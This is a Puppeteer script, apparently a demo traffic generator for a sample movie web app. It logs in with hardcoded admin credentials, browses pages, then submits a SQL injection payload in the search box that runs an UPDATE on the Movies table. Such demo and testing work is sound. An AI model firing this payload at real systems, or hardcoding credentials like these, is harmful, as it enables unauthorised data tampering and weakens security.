const puppeteer = require('puppeteer');

(async () => {
  if (!process.env.BASEURL) {
      console.log('Please specify a base url. E.g. `BASEURL=http://example.org node attack.js`');
  } else {
    var browser;

    if (process.env.DEBUG) {
      browser = await puppeteer.launch({
          headless: false,
          executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
      });
    } else {
      browser = await puppeteer.launch();
    }

    function delay(time) {
      return new Promise(function(resolve) { 
          setTimeout(resolve, time)
      });
    }

    const page = await browser.newPage()
    await page.setViewport({ width: 1366, height: 768});
    page.setDefaultNavigationTimeout(120000) //2 mins

    const navigationPromise = page.waitForNavigation()

    const pageOptions = {waitUntil: 'domcontentloaded'}
    const selectorOptions = {"timeout": 120000} //2 mins

    try {
      //Add error handling here in case the endpoint is not ready.
      await page.goto(process.env.BASEURL, pageOptions);
    } catch (error) {
      console.log(error);
      browser.close();
    }

    //Log in
    console.log('Logging in');
    await page.goto(process.env.BASEURL + '/Movie/ViewAll', pageOptions);

    await page.waitForSelector('input#Email', selectorOptions);
    await page.type('input#Email', 'admin@dotnetflicks.com');

    await page.waitForSelector('input#Password', selectorOptions)
    await page.type('input#Password', 'p@ssWORD471')

    await page.waitForSelector('form button', selectorOptions)
    await page.click('form button')

    await navigationPromise

    await delay(5000);

    //Browse Movies
    console.log('Browse movies');
    await page.goto(process.env.BASEURL + '/Movie/ViewAll', pageOptions);

    //Movies for user
    console.log('Movies for user');
    await page.goto(process.env.BASEURL + '/Movie/ViewAllForUser', pageOptions);

    //Movies admin
    console.log('Movies search');
    await page.goto(process.env.BASEURL + '/Movie', pageOptions);

    await page.waitForSelector('input[name="Search"]', selectorOptions);
    await page.type('input[name="Search"]', 'Coco');
    await (await page.$('input[name="Search"]')).press('Enter');

    //Movies attack
    console.log('Movies search');
    await page.goto(process.env.BASEURL + '/Movie', pageOptions);

    await page.waitForSelector('input[name="Search"]', selectorOptions);
    await page.type('input[name="Search"]', "'); UPDATE Movies SET name = 'Shrek' --");
    await (await page.$('input[name="Search"]')).press('Enter');

    await navigationPromise

    //Quit
    if (!process.env.DEBUG) {await browser.close()}

  }
})()
